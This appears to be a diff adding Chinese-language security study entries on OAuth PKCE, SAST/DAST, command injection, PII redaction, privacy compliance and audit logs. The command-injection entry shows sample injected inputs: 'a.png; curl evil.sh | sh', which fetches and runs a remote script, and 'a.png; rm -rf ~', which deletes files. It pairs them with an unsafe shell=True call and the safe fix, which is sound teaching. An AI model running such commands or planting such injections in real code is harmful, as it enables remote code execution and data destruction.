+   "src": "// 生成 code_verifier（32 字节随机数 → 43 个 Base64URL 字符）\nfunction base64url(bytes) {\n  return btoa(String.fromCharCode(...new Uint8Array(bytes)))\n    .replace(/\\+/g, \"-\").replace(/\\//g, \"_\").replace(/=+$/, \"\");\n}\nconst verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));\n\n// code_challenge = BASE64URL(SHA256(verifier))\nconst digest = await crypto.subtle.digest(\"SHA-256\", new TextEncoder().encode(verifier));\nconst challenge = base64url(digest);\nsessionStorage.setItem(\"pkce_verifier\", verifier);\n\nconst url = new URL(\"https://auth.example.com/authorize\");\nurl.search = new URLSearchParams({\n  response_type: \"code\", client_id: \"my-spa\",\n  redirect_uri: \"https://app.example.com/callback\",\n  scope: \"openid profile\", state: crypto.randomUUID(),\n  code_challenge: challenge, code_challenge_method: \"S256\",\n}).toString();\nlocation.assign(url);\n// 回调后 POST /token 时附带 code 和 code_verifier=sessionStorage 中的值",
+   "note": "演示原理；生产中建议使用 oauth4webapi 等成熟库，并校验 state 防 CSRF。"
+  },
+  "table": {
+   "title": "OAuth 客户端与 PKCE",
+   "head": [
+    "客户端类型",
+    "能否保存密钥",
+    "建议"
+   ],
+   "rows": [
+    [
+     "服务端 Web 应用",
+     "能（机密客户端）",
+     "client_secret + PKCE"
+    ],
+    [
+     "单页应用 SPA",
+     "不能",
+     "授权码 + PKCE，禁止隐式流程"
+    ],
+    [
+     "移动/桌面 App",
+     "不能",
+     "授权码 + PKCE，使用系统浏览器"
+    ],
+    [
+     "CLI / 设备",
+     "不能",
+     "PKCE 或设备授权流程"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "授权码 + PKCE",
+    "pros": "防截获，无需前端存密钥",
+    "cons": "多一步实现，依赖授权服务器支持",
+    "when": "所有新客户端的默认选择"
+   },
+   {
+    "opt": "隐式流程 (Implicit)",
+    "pros": "实现简单",
+    "cons": "令牌暴露在 URL，已不推荐",
+    "when": "不应再用于新项目"
+   },
+   {
+    "opt": "BFF 代管令牌",
+    "pros": "令牌不进浏览器，降低 XSS 窃取风险",
+    "cons": "需要后端组件与会话",
+    "when": "安全要求高的 SPA"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "使用 plain 方法或固定的 verifier",
+    "fix": "始终使用 S256，每次授权重新生成随机 verifier"
+   },
+   {
+    "bad": "以为有了 PKCE 就不需要 state",
+    "fix": "PKCE 防授权码冒用，state（或 nonce）仍用于防 CSRF 与关联请求"
+   },
+   {
+    "bad": "在 SPA 或 App 中内嵌 client_secret",
+    "fix": "公共客户端不使用密钥，依靠 PKCE 与精确的重定向 URI"
+   },
+   {
+    "bad": "用不安全的随机数生成 verifier",
+    "fix": "使用 crypto.getRandomValues 等密码学安全随机源"
+   }
+  ],
+  "checklist": [
+   "授权码流程启用 PKCE 且方法为 S256",
+   "verifier 每次随机生成且只存本地会话",
+   "同时校验 state/nonce",
+   "授权服务器对公共客户端强制 PKCE",
+   "重定向 URI 精确匹配"
+  ],
+  "interview": [
+   {
+    "q": "PKCE 为什么能防授权码拦截？",
+    "a": "攻击者截获的只是授权码；换令牌需要原始 verifier，而授权请求中只出现了它的 SHA-256 哈希，哈希不可逆，攻击者无法构造 verifier，因此无法兑换令牌。"
+   },
+   {
+    "q": "机密客户端还需要 PKCE 吗？",
+    "a": "需要。RFC 9700 建议所有客户端使用 PKCE：它还能防授权码注入攻击，即攻击者把自己的授权码注入受害者会话。OAuth 2.1 草案也将其设为授权码流程的必选项。"
+   },
+   {
+    "q": "PKCE 能防 XSS 窃取令牌吗？",
+    "a": "不能。PKCE 保护的是授权码兑换环节；令牌一旦进入浏览器，XSS 仍可读取。应配合 CSP、短期令牌、刷新令牌轮换或 BFF 模式。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "RFC 7636：PKCE",
+    "url": "https://datatracker.ietf.org/doc/html/rfc7636"
+   },
+   {
+    "title": "RFC 9700：OAuth 2.0 Security Best Current Practice",
+    "url": "https://datatracker.ietf.org/doc/html/rfc9700"
+   },
+   {
+    "title": "oauth.net：PKCE",
+    "url": "https://oauth.net/2/pkce/"
+   }
+  ]
+ },
+ {
+  "slug": "sast-and-dast",
+  "def": "SAST（Static Application Security Testing，静态应用安全测试）在不运行程序的情况下分析源码、字节码或配置以发现漏洞；DAST（Dynamic Application Security Testing，动态应用安全测试）从外部对运行中的应用发起请求，观察响应以发现可利用问题。二者属于安全测试与 DevSecOps 层，常与 SCA（依赖漏洞扫描）、密钥扫描一起嵌入 CI。",
+  "how": [
+   "SAST 解析代码为语法树或数据流图，按规则匹配危险模式，如未经处理的输入流入 SQL 拼接（污点分析）。",
+   "SAST 在 IDE、提交或 PR 阶段运行，结果精确到文件与行号，便于开发者在编写时修复。",
+   "DAST 先爬取或依据 OpenAPI 定义发现页面与接口，再发送注入、跨站脚本等攻击载荷。",
+   "DAST 根据响应内容、状态码与时延判断漏洞，并检查安全头、Cookie 属性、TLS 等配置问题。",
+   "两类结果汇总到告警平台，按严重度分级，设定阻断阈值，并跟踪误报处理与修复。"
+  ],
+  "terms": [
+   {
+    "t": "污点分析 (Taint Analysis)",
+    "d": "追踪不可信输入从来源到危险函数（sink）的数据流。"
+   },
+   {
+    "t": "误报 / 漏报 (False Positive / Negative)",
+    "d": "报告了不存在的问题 / 漏掉真实问题。"
+   },
+   {
+    "t": "SCA (Software Composition Analysis)",
+    "d": "扫描第三方依赖的已知漏洞与许可证。"
+   },
+   {
+    "t": "IAST",
+    "d": "交互式测试，在运行时通过插桩观察应用内部数据流。"
+   },
+   {
+    "t": "SARIF",
+    "d": "静态分析结果交换格式，GitHub 代码扫描等平台支持。"
+   }
+  ],
+  "code": {
+   "lang": "yaml",
+   "title": "CI 中运行 Semgrep 与 ZAP",
+   "src": "# .github/workflows/security.yml\nname: security\non: [pull_request]\njobs:\n  sast:\n    runs-on: ubuntu-latest\n    container: semgrep/semgrep\n    steps:\n      - uses: actions/checkout@v4\n      # 使用社区规则扫描，有发现时以非零退出码使任务失败\n      - run: semgrep scan --config auto --error\n  dast:\n    runs-on: ubuntu-latest\n    steps:\n      # 对已部署的测试环境做被动基线扫描（不要对生产做主动攻击扫描）\n      - run: |\n          docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \\\n            zap-baseline.py -t https://staging.example.com",
+   "note": "SAST 每个 PR 运行；DAST 针对预发环境，基线扫描以被动检查为主。目标地址为示例。"
+  },
+  "table": {
+   "title": "应用安全测试方法对比",
+   "head": [
+    "方法",
+    "时机",
+    "能发现",
+    "局限"
+   ],
+   "rows": [
+    [
+     "SAST",
+     "编码/PR",
+     "注入、硬编码密钥、危险 API",
+     "误报较多，看不到运行时配置"
+    ],
+    [
+     "DAST",
+     "测试/预发环境",
+     "可利用漏洞、配置与头部问题",
+     "定位不到代码行，覆盖依赖爬取"
+    ],
+    [
+     "SCA",
+     "依赖变更时",
+     "第三方组件已知 CVE",
+     "只能发现已披露漏洞"
+    ],
+    [
+     "IAST",
+     "测试运行时",
+     "带上下文的数据流漏洞",
+     "需插桩，语言支持有限"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "只用 SAST",
+    "pros": "早发现、成本低、定位精确",
+    "cons": "误报多，运行时问题看不到",
+    "when": "开发阶段的基础防线"
+   },
+   {
+    "opt": "只用 DAST",
+    "pros": "结果贴近真实攻击，误报相对少",
+    "cons": "发现晚、需可运行环境、难定位",
+    "when": "上线前验证"
+   },
+   {
+    "opt": "SAST + DAST + SCA",
+    "pros": "覆盖代码、运行时与依赖",
+    "cons": "工具与告警治理成本",
+    "when": "有一定规模、合规要求的产品"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "一次开启全部规则，告警淹没团队",
+    "fix": "先启用高置信度规则并只阻断高危，逐步扩大"
+   },
+   {
+    "bad": "对生产环境跑主动 DAST 扫描",
+    "fix": "在预发或隔离环境扫描，生产只做被动检查并事先授权"
+   },
+   {
+    "bad": "把扫描通过当作没有漏洞",
+    "fix": "扫描无法发现业务逻辑与越权问题，需威胁建模与人工评审"
+   },
+   {
+    "bad": "AI 修复建议直接合并",
+    "fix": "修复后重新扫描并补充测试，确认未引入新问题"
+   }
+  ],
+  "checklist": [
+   "PR 自动运行 SAST 并阻断高危",
+   "依赖与密钥扫描已开启",
+   "预发环境定期运行 DAST",
+   "误报有标记与复审流程",
+   "结果集中展示并跟踪修复期限",
+   "AI 生成代码同样经过扫描"
+  ],
+  "interview": [
+   {
+    "q": "SAST 为什么误报多，如何降低？",
+    "a": "静态分析无法知道运行时数据和所有调用路径，只能保守推断。可通过调优规则、声明自定义清洗函数（sanitizer）、只启用高置信度规则、按路径排除测试代码来降低。"
+   },
+   {
+    "q": "DAST 为什么发现不了越权（IDOR）问题？",
+    "a": "越权需要理解业务含义：哪个用户可以访问哪个对象。通用扫描器通常不知道这些规则，需要多账号测试、手工渗透或专门编写的授权测试。"
+   },
+   {
+    "q": "AI 编码时代 SAST 有什么新价值？",
+    "a": "AI 生成代码速度快、量大，可能复制不安全模式；在 PR 中自动运行 SAST 是低成本的护栏，扫描结果还能直接交给 Agent 修复，再由扫描与测试复核。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Wikipedia: Static application security testing",
+    "url": "https://en.wikipedia.org/wiki/Static_application_security_testing"
+   },
+   {
+    "title": "Semgrep 文档",
+    "url": "https://docs.semgrep.dev/"
+   },
+   {
+    "title": "ZAP 文档：Baseline Scan",
+    "url": "https://www.zaproxy.org/docs/docker/baseline-scan/"
+   }
+  ]
+ },
+ {
+  "slug": "command-injection",
+  "def": "命令注入（OS Command Injection，CWE-78）指应用把不可信输入拼接进操作系统命令并交给 shell 执行，攻击者通过 ;、|、&&、$() 等元字符追加任意命令，常直接导致远程代码执行（RCE）。它属于应用安全的注入类漏洞，是 OWASP Top 10「注入」的一部分。AI Agent 执行 shell 命令、处理文件名的场景尤其容易引入。",
+  "how": [
+   "应用调用 system()、exec()、subprocess(shell=True) 等接口，把用户输入拼进命令字符串。",
+   "shell 解析整个字符串，元字符被解释为命令分隔、管道或子命令替换。",
+   "攻击者输入如 a.png; curl evil.sh | sh，后半段以应用进程的权限执行。",
+   "即使不经过 shell，若把输入作为参数传给 git、tar 等程序，以 - 开头的值仍可能被当成选项（参数注入）。",
+   "防御核心是不经过 shell：以参数数组调用程序，或改用语言原生库，再叠加白名单校验与最小权限。"
+  ],
+  "terms": [
+   {
+    "t": "RCE (Remote Code Execution)",
+    "d": "攻击者能在目标服务器上执行任意代码。"
+   },
+   {
+    "t": "Shell 元字符 (Metacharacters)",
+    "d": "; | & $ ` > < 等被 shell 赋予特殊含义的字符。"
+   },
+   {
+    "t": "参数注入 (Argument Injection)",
+    "d": "输入被目标程序当作命令行选项解析。"
+   },
+   {
+    "t": "参数数组 (argv)",
+    "d": "以列表形式传参，不经 shell 解析，每项都是单个参数。"
+   },
+   {
+    "t": "CWE-78",
+    "d": "MITRE 对 OS 命令注入弱点的编号。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "危险与安全的调用方式",
+   "src": "import re, subprocess\n\nfilename = request_args[\"file\"]   # 来自用户，如 \"a.png; rm -rf ~\"\n\n# ❌ shell=True + 字符串拼接：分号后的命令会被执行\nsubprocess.run(f\"convert {filename} out.jpg\", shell=True)\n\n# ✅ 先做白名单校验，再用参数列表调用，不经过 shell\nif not re.fullmatch(r\"[\\w.-]{1,100}\", filename) or filename.startswith(\"-\"):\n    raise ValueError(\"invalid filename\")\nsubprocess.run([\"convert\", \"--\", filename, \"out.jpg\"],\n               check=True, timeout=30)\n# \"--\" 告诉多数程序其后都是位置参数，防止参数注入（需目标程序支持）\n\n# ✅ 更好：能用库就别调命令行，如用 Pillow 处理图片\n# from PIL import Image; Image.open(path).convert(\"RGB\").save(\"out.jpg\")",
+   "note": "参数列表让输入始终是一个参数；白名单与 -- 进一步防止参数注入。request_args 为示意变量。"
+  },
+  "table": {
+   "title": "各语言安全调用方式",
+   "head": [
+    "语言",
+    "危险写法",
+    "安全写法"
+   ],
+   "rows": [
+    [
+     "Python",
+     "os.system / shell=True",
+     "subprocess.run([...])"
+    ],
+    [
+     "Node.js",
+     "child_process.exec(str)",
+     "execFile / spawn(cmd, args)"
+    ],
+    [
+     "PHP",
+     "shell_exec / system 拼接",
+     "避免调用；必要时 escapeshellarg"
+    ],
+    [
+     "Go",
+     "exec.Command(\"sh\",\"-c\",str)",
+     "exec.Command(prog, args...)"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "参数数组调用",
+    "pros": "从根本上避免 shell 解析",
+    "cons": "无法使用管道、通配等 shell 特性",
+    "when": "必须调用外部程序时"
+   },
+   {
+    "opt": "语言原生库替代",
+    "pros": "无进程边界，无注入面",
+    "cons": "需寻找等价库",
+    "when": "图片、压缩、网络等常见操作"
+   },
+   {
+    "opt": "转义（如 shlex.quote）",
+    "pros": "可保留 shell 特性",
+    "cons": "易遗漏，跨 shell 行为不一",
+    "when": "确实需要 shell 的遗留代码"
+   },
+   {
+    "opt": "沙箱/容器隔离执行",
+    "pros": "限制成功攻击的影响",
+    "cons": "不修复漏洞本身",
+    "when": "Agent 执行任意命令的场景"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "以为加引号包住输入就安全",
+    "fix": "引号可被闭合；使用参数数组而非字符串拼接"
+   },
+   {
+    "bad": "用黑名单过滤 ; 和 |",
+    "fix": "黑名单易绕过（换行、$()、反引号），改用白名单与不经 shell"
+   },
+   {
+    "bad": "忽视参数注入，输入以 - 开头",
+    "fix": "使用 -- 分隔并拒绝以 - 开头的值"
+   },
+   {
+    "bad": "让 Agent 以高权限直接执行模型生成的命令",
+    "fix": "在沙箱中以最小权限运行，危险命令需人工确认"
+   }
+  ],
+  "checklist": [
+   "代码中无 shell=True/exec 拼接用户输入",
+   "外部命令使用参数数组",
+   "输入有白名单校验",
+   "进程以最小权限运行",
+   "SAST 规则覆盖命令执行函数",
+   "Agent 命令执行在沙箱中"
+  ],
+  "interview": [
+   {
+    "q": "为什么参数数组能防命令注入？",
+    "a": "不启动 shell，操作系统直接以 argv 执行程序；每个元素原样作为一个参数，; | $() 等不会被解释，输入最多影响该参数本身。"
+   },
+   {
+    "q": "参数数组之后还有什么风险？",
+    "a": "参数注入：目标程序会把以 - 开头的值当选项（如 git 的 --upload-pack 可执行命令）。还要防路径遍历、程序本身的漏洞，并对输入做白名单。"
+   },
+   {
+    "q": "AI Agent 场景如何降低命令注入风险？",
+    "a": "工具设计为结构化参数而非任意 shell；执行环境隔离（容器、无网络或网络白名单）；命令白名单与人工审批；对外部内容（网页、文件）中的指令保持怀疑，防止提示注入诱导执行。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP：Command Injection",
+    "url": "https://community.owasp.org/attacks/Command_Injection"
+   },
+   {
+    "title": "OWASP：OS Command Injection Defense Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+   },
+   {
+    "title": "MITRE CWE-78",
+    "url": "https://cwe.mitre.org/data/definitions/78.html"
+   }
+  ]
+ },
+ {
+  "slug": "pii-redaction",
+  "def": "PII 脱敏（PII Redaction）指在日志、分析数据、第三方调用（包括发给大模型的提示）中识别并遮蔽、替换或删除个人身份信息，如姓名、手机号、证件号、邮箱、地址、银行卡号。它属于数据安全与隐私工程层，是数据最小化原则的落地手段，可降低泄露影响与合规风险。",
+  "how": [
+   "梳理数据流，确定 PII 可能出现的位置：请求日志、错误追踪、分析埋点、LLM 提示与输出。",
+   "识别：用正则与校验规则（如证件号校验位）、字典、NER 模型或组合检测器找出 PII 实体。",
+   "处理：按场景选择遮蔽（138****5678）、替换为类型占位符、哈希、加密或可逆的令牌化。",
+   "在数据离开受信边界前执行，如日志写入前、调用外部模型前，而非事后清洗。",
+   "需要还原时（如 LLM 回答中引用用户姓名），由服务端用令牌映射表替换回原值，映射表严格限权。"
+  ],
+  "terms": [
+   {
+    "t": "PII (Personally Identifiable Information)",
+    "d": "能直接或结合其他信息识别个人的数据。"
+   },
+   {
+    "t": "遮蔽 (Masking)",
+    "d": "用星号等字符替换部分内容，保留格式。"
+   },
+   {
+    "t": "令牌化 (Tokenization)",
+    "d": "用无意义令牌替换原值，映射表单独保存，可逆。"
+   },
+   {
+    "t": "假名化 (Pseudonymisation)",
+    "d": "处理后需借助额外信息才能识别个人，GDPR 中仍属个人数据。"
+   },
+   {
+    "t": "匿名化 (Anonymisation)",
+    "d": "无法再识别个人，通常不再受个人数据法规约束。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "日志与 LLM 调用前的脱敏",
+   "src": "import re, uuid\n\nPATTERNS = {\n    \"PHONE\": re.compile(r\"(?<!\\d)1[3-9]\\d{9}(?!\\d)\"),             # 中国大陆手机号\n    \"ID\":    re.compile(r\"(?<!\\d)\\d{17}[\\dXx](?!\\d)\"),             # 18 位身份证号\n    \"EMAIL\": re.compile(r\"[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+(?:\\.[A-Za-z0-9-]+)+\"),\n}\n\ndef redact(text: str, vault: dict | None = None) -> str:\n    \"\"\"把 PII 替换为占位符；传入 vault 时记录映射以便服务端还原\"\"\"\n    for kind, pat in PATTERNS.items():\n        def sub(m):\n            token = f\"<{kind}_{uuid.uuid4().hex[:6]}>\"\n            if vault is not None:\n                vault[token] = m.group()\n            return token\n        text = pat.sub(sub, text)\n    return text\n\nvault = {}\nprompt = redact(\"我叫小王，电话13812345678，邮箱wang@example.com\", vault)\nprint(prompt)   # 发给模型的内容不含原始手机号与邮箱\n# 模型回复中的占位符可用 vault 在服务端替换回原值",
+   "note": "正则只覆盖格式固定的 PII；姓名、地址需 NER（如 Microsoft Presidio）辅助检测。"
+  },
+  "table": {
+   "title": "脱敏方式对比",
+   "head": [
+    "方式",
+    "可逆",
+    "保留可用性",
+    "典型场景"
+   ],
+   "rows": [
+    [
+     "遮蔽",
+     "否",
+     "保留格式，便于人工核对",
+     "客服界面、日志"
+    ],
+    [
+     "占位符替换",
+     "否（或配映射表）",
+     "保留语义类型",
+     "LLM 提示、分析"
+    ],
+    [
+     "哈希（加盐/HMAC）",
+     "否",
+     "可做关联与去重",
+     "埋点用户 ID"
+    ],
+    [
+     "令牌化/加密",
+     "是（需密钥/映射）",
+     "可还原原值",
+     "支付卡、需回填的流程"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "规则/正则检测",
+    "pros": "快、可解释、零成本",
+    "cons": "对姓名、地址等非结构化 PII 漏检",
+    "when": "格式固定的字段"
+   },
+   {
+    "opt": "NER 模型检测",
+    "pros": "覆盖非结构化文本",
+    "cons": "有误报漏报，需算力，中文支持需验证",
+    "when": "聊天记录、文档"
+   },
+   {
+    "opt": "源头不记录（字段白名单）",
+    "pros": "最彻底",
+    "cons": "排障信息可能不足",
+    "when": "日志与埋点设计"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "先全量写日志，再定期批量清洗",
+    "fix": "在写入前脱敏，并对日志字段使用白名单"
+   },
+   {
+    "bad": "只脱敏请求体，忽略 URL 参数和错误堆栈",
+    "fix": "覆盖 URL、Header、异常信息与第三方 SDK 上报"
+   },
+   {
+    "bad": "用无盐哈希处理手机号，被字典轻易还原",
+    "fix": "使用带密钥的 HMAC，或改用令牌化"
+   },
+   {
+    "bad": "把可逆映射表和脱敏数据放在一起",
+    "fix": "映射表单独存储、加密并严格限制访问"
+   }
+  ],
+  "checklist": [
+   "梳理 PII 数据流与存储位置",
+   "日志采用字段白名单并在写入前脱敏",
+   "调用外部模型前执行脱敏",
+   "错误追踪与埋点 SDK 已配置过滤",
+   "可逆映射表单独加密存储",
+   "定期抽查日志中的 PII 残留"
+  ],
+  "interview": [
+   {
+    "q": "假名化和匿名化有什么区别？",
+    "a": "假名化后借助额外信息（如映射表、密钥）仍可识别个人，GDPR 下仍是个人数据；匿名化后无法以合理手段重新识别，才可能脱离个人数据范畴。仅哈希手机号通常只算假名化。"
+   },
+   {
+    "q": "向 LLM 发送数据时如何处理 PII？",
+    "a": "先评估是否真的需要；需要时在服务端用占位符替换，模型只处理语义，返回后再还原；同时确认供应商的数据保留与训练使用政策，签订数据处理协议。"
+   },
+   {
+    "q": "为什么正则脱敏不够？",
+    "a": "正则只能匹配格式固定的模式；姓名、地址、自由文本中的健康信息等无固定格式，还存在组合识别风险。需要 NER 模型、字段级白名单与数据最小化共同作用。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Microsoft Presidio 文档",
+    "url": "https://microsoft.github.io/presidio/"
+   },
+   {
+    "title": "OWASP：Logging Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html"
+   },
+   {
+    "title": "NIST SP 800-122：Guide to Protecting the Confidentiality of PII",
+    "url": "https://csrc.nist.gov/pubs/sp/800/122/final"
+   }
+  ]
+ },
+ {
+  "slug": "data-privacy-compliance",
+  "def": "数据合规指在收集、存储、使用、共享和删除个人信息时满足法律要求，代表法规有欧盟 GDPR（2018 年 5 月起适用）、中国《个人信息保护法》（2021 年 11 月 1 日起施行）与美国加州 CCPA/CPRA。它属于法务与产品治理层，核心原则包括合法依据、告知同意、目的限制、最小必要、安全保障与个人权利响应。以下为工程视角概述，不构成法律意见。",
+  "how": [
+   "数据盘点：记录收集哪些个人信息、目的、法律依据、存储位置、保留期限与共享对象。",
+   "确定处理的合法性基础：GDPR 规定同意、合同履行、法定义务等六类；PIPL 以同意为主并列明其他情形。",
+   "通过隐私政策告知，敏感个人信息需单独同意；默认设置遵循最小必要（Privacy by Default）。",
+   "实施技术与组织措施：加密、访问控制、脱敏、审计；高风险处理前做影响评估（DPIA / 个人信息保护影响评估）。",
+   "建立权利响应与事件流程：查阅、更正、删除、可携带、撤回同意；数据泄露按法规时限通知监管与用户。"
+  ],
+  "terms": [
+   {
+    "t": "数据控制者 / 个人信息处理者",
+    "d": "决定处理目的与方式的主体，承担主要合规责任。"
+   },
+   {
+    "t": "数据处理者 / 受托方",
+    "d": "代表控制者处理数据的一方，如云服务、模型 API 供应商。"
+   },
+   {
+    "t": "DPIA",
+    "d": "数据保护影响评估，针对高风险处理事先评估与缓解。"
+   },
+   {
+    "t": "DSAR",
+    "d": "数据主体访问请求，用户要求查阅或获取其个人数据。"
+   },
+   {
+    "t": "跨境传输 (Cross-border Transfer)",
+    "d": "向境外提供个人信息，需满足相应法定机制。"
+   },
+   {
+    "t": "敏感个人信息",
+    "d": "生物识别、医疗健康、金融账户、行踪轨迹等，泄露易造成严重危害。"
+   }
+  ],
+  "code": {
+   "lang": "sql",
+   "title": "数据保留与删除请求处理",
+   "src": "-- 1. 按保留策略清理：超过 180 天的原始访问日志直接删除\nDELETE FROM access_logs WHERE created_at < now() - interval '180 days';\n\n-- 2. 用户注销/删除请求：在一个事务中处理该用户的个人数据\nBEGIN;\n-- 订单因财税法规需保留：去标识化而不是删除\nUPDATE orders\n   SET receiver_name = NULL, receiver_phone = NULL, address = NULL\n WHERE user_id = :uid;\nDELETE FROM user_profiles   WHERE user_id = :uid;\nDELETE FROM chat_messages   WHERE user_id = :uid;\nUPDATE users SET email = NULL, phone = NULL, deleted_at = now()\n WHERE id = :uid;\n-- 记录处理结果以备审计（不含被删除的内容本身）\nINSERT INTO privacy_requests (user_id, kind, done_at) VALUES (:uid, 'erasure', now());\nCOMMIT;\n-- 备份、搜索索引、分析仓库、第三方处理者中的副本需另行处理",
+   "note": "删除请求要覆盖所有副本；有法定保存义务的数据做去标识化而非直接删除。"
+  },
+  "table": {
+   "title": "主要法规要点对比（概要）",
+   "head": [
+    "维度",
+    "GDPR（欧盟）",
+    "个人信息保护法（中国）"
+   ],
+   "rows": [
+    [
+     "适用范围",
+     "欧盟境内处理及面向欧盟个人",
+     "境内处理及面向境内自然人的境外处理"
+    ],
+    [
+     "处罚上限",
+     "2000 万欧元或全球年营业额 4%",
+     "5000 万元或上一年营业额 5%"
+    ],
+    [
+     "泄露通知",
+     "知悉后 72 小时内通知监管（如适用）",
+     "立即采取措施并通知部门和个人"
+    ],
+    [
+     "跨境传输",
+     "充分性认定、标准合同条款等",
+     "安全评估、认证或标准合同等"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "隐私设计 (Privacy by Design)",
+    "pros": "从源头减少数据，后期改造成本低",
+    "cons": "前期需更多设计投入",
+    "when": "新产品与新功能"
+   },
+   {
+    "opt": "合规后补",
+    "pros": "早期速度快",
+    "cons": "改造数据模型与流程代价大，风险高",
+    "when": "不推荐，仅作临时状态"
+   },
+   {
+    "opt": "采购合规服务（同意管理、DSAR 工具）",
+    "pros": "快速满足流程要求",
+    "cons": "费用与集成成本",
+    "when": "用户量大、多法域运营"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "把用户数据发给第三方模型 API 却未告知",
+    "fix": "在隐私政策中披露，签数据处理协议，确认不用于训练"
+   },
+   {
+    "bad": "删除只删主表，忘了备份、日志、分析仓库",
+    "fix": "建立数据地图，删除流程覆盖全部副本或按保留期自然过期"
+   },
+   {
+    "bad": "预先勾选同意或捆绑同意",
+    "fix": "同意需主动、具体、可撤回，敏感信息单独同意"
+   },
+   {
+    "bad": "收集「以后可能有用」的数据",
+    "fix": "按明确目的最小化收集，并设定保留期限"
+   }
+  ],
+  "checklist": [
+   "有数据清单与数据流图",
+   "隐私政策与实际收集一致",
+   "敏感信息单独同意并加强保护",
+   "支持查阅、更正、删除与撤回同意",
+   "第三方处理者签订数据处理协议",
+   "有泄露应急与通知流程"
+  ],
+  "interview": [
+   {
+    "q": "GDPR 的「合法利益」能替代同意吗？",
+    "a": "可以作为合法性基础之一，但需做平衡测试，证明处理必要且不凌驾于个人权利之上，并允许反对。营销、儿童数据等场景需谨慎，具体应由法务判断。"
+   },
+   {
+    "q": "个保法下向境外 AI 服务发送用户数据要注意什么？",
+    "a": "这属于个人信息出境：需告知并取得单独同意，满足安全评估、认证或标准合同等法定条件之一（视数据量与类型），做影响评估并保留记录。具体门槛以监管最新规定为准。"
+   },
+   {
+    "q": "工程上如何支持「被遗忘权」？",
+    "a": "维护数据地图知道数据在哪；用户 ID 作为可追踪的关联键；删除任务覆盖数据库、对象存储、搜索、分析与第三方；备份按保留期过期；记录处理结果。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "GDPR 条文汇编 (gdpr-info.eu)",
+    "url": "https://gdpr-info.eu/"
+   },
+   {
+    "title": "国家网信办：中华人民共和国个人信息保护法",
+    "url": "https://www.cac.gov.cn/2021-08/20/c_1631050028355286.htm"
+   },
+   {
+    "title": "European Commission：Data protection",
+    "url": "https://commission.europa.eu/law/law-topic/data-protection_en"
+   }
+  ]
+ },
+ {
+  "slug": "audit-logs",
+  "def": "审计日志（Audit Log）是对安全与业务关键操作的不可篡改、按时间顺序的记录，回答「谁（主体）在何时、从哪里、对什么对象、做了什么、结果如何」。它属于安全治理与合规层，服务于事件调查、责任追溯、合规审计（如 SOC 2、ISO 27001）以及企业客户的自助审计需求，与面向排障的应用日志目的不同。",
+  "how": [
+   "定义需审计的事件：登录与认证变更、权限与角色修改、敏感数据访问与导出、配置变更、删除操作。",
+   "为每个事件记录结构化字段：时间、操作者（含 API Key/服务账号）、来源 IP、动作、目标资源、结果、请求 ID。",
+   "写入与业务数据分离的仅追加存储，应用账号只有插入权限，不能更新或删除。",
+   "通过哈希链、WORM 存储（如对象锁）或外部日志服务增强防篡改能力，并按合规要求设定保留期。",
+   "提供检索、导出与告警：异常行为（批量导出、非工作时间提权）触发通知，企业客户可在后台查询。"
+  ],
+  "terms": [
+   {
+    "t": "审计追踪 (Audit Trail)",
+    "d": "按时间顺序串联的操作记录，可还原事件经过。"
+   },
+   {
+    "t": "仅追加 (Append-only)",
+    "d": "只允许新增记录，不允许修改或删除。"
+   },
+   {
+    "t": "WORM (Write Once Read Many)",
+    "d": "写入后不可改写的存储模式，如 S3 Object Lock。"
+   },
+   {
+    "t": "哈希链 (Hash Chain)",
+    "d": "每条记录包含前一条的哈希，篡改会破坏链条。"
+   },
+   {
+    "t": "不可抵赖性 (Non-repudiation)",
+    "d": "操作者无法否认其执行过的操作。"
+   }
+  ],
+  "code": {
+   "lang": "sql",
+   "title": "PostgreSQL 仅追加审计表",
+   "src": "CREATE TABLE audit_log (\n  id          bigserial PRIMARY KEY,\n  occurred_at timestamptz NOT NULL DEFAULT now(),\n  actor_id    text NOT NULL,          -- 用户、服务账号或 API Key ID\n  actor_ip    inet,\n  action      text NOT NULL,          -- 如 'user.role.update'\n  target      text NOT NULL,          -- 如 'user:42'\n  result      text NOT NULL,          -- 'success' | 'denied'\n  metadata    jsonb,                  -- 变更前后差异等（勿写入密码与密钥）\n  request_id  text\n);\nCREATE INDEX ON audit_log (target, occurred_at);\n\n-- 应用账号只能插入和查询，不能改删\nREVOKE ALL ON audit_log FROM app_user;\nGRANT INSERT, SELECT ON audit_log TO app_user;\nGRANT USAGE ON SEQUENCE audit_log_id_seq TO app_user;\n\nINSERT INTO audit_log (actor_id, actor_ip, action, target, result, metadata, request_id)\nVALUES ('u_7', '203.0.113.5', 'user.role.update', 'user:42', 'success',\n        '{\"from\":\"member\",\"to\":\"admin\"}', 'req_abc');",
+   "note": "权限层面禁止改删；更高要求可同步到 WORM 存储或独立日志服务，防数据库管理员篡改。"
+  },
+  "table": {
+   "title": "审计日志与相关日志对比",
+   "head": [
+    "类型",
+    "目的",
+    "保留与完整性"
+   ],
+   "rows": [
+    [
+     "审计日志",
+     "追责、合规、安全调查",
+     "长期保留，防篡改"
+    ],
+    [
+     "应用日志",
+     "排查故障",
+     "短期保留，可轮转清理"
+    ],
+    [
+     "访问日志",
